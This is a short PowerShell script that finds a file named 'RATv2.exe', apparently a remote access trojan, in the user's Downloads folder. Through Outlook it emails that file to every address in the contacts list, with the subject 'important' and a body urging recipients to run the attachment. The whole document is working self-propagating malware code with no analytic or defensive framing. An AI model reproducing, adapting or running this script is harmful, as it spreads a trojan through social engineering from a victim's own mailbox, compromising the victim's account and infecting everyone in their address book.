$fileName = "RATv2.exe"
$downloadsPath = [System.Environment]::GetFolderPath("Downloads")
$filePath = Get-ChildItem -Path $downloadsPath -Filter $fileName -Recurse | Select-Object -ExpandProperty FullName

if ($filePath -ne $null) {
    $payload = $filePath
    Write-Output "Full path of $fileName is stored in the variable \$outputPath."
} else {
    Write-Output "File $fileName not found in the Downloads folder."
}

# Create a new Outlook application object
$outlook = New-Object -ComObject Outlook.Application

# Get the MAPI namespace
$namespace = $outlook.GetNamespace("MAPI")

# Get the Contacts folder
$contactsFolder = $namespace.GetDefaultFolder(10) # 10 represents the Contacts folder

# Define the file path to attach
$fileToAttach = "$payload"

# Loop through each contact and send a file to their email address
foreach ($contact in $contactsFolder.Items) {
    if ($contact.Class -eq 40) { # Check if the item is a contact (Class 40)
        $email1 = $contact.Email1Address
        $email2 = $contact.Email2Address
        $email3 = $contact.Email3Address
        
        # Check if at least one email address is available
        if ($email1 -ne "" -or $email2 -ne "" -or $email3 -ne "") {
            # Create a new mail item
            $mail = $outlook.CreateItem(0)  # 0 represents a mail item
            
            # Add recipients
            if ($email1 -ne "") {
                $mail.Recipients.Add($email1)
            }
            if ($email2 -ne "") {
                $mail.Recipients.Add($email2)
            }
            if ($email3 -ne "") {
                $mail.Recipients.Add($email3)
            }
            
            # Subject and body of the email
            $mail.Subject = "important"
            $mail.Body = "Please run the attached file."
            
            # Attach the file
            $attachment = $mail.Attachments.Add($fileToAttach)
            
            # Send the email
            $mail.Send()
            
            # Display confirmation message
            Write-Output "Email sent to $($mail.Recipients.Count) recipients."
        }
    }
}
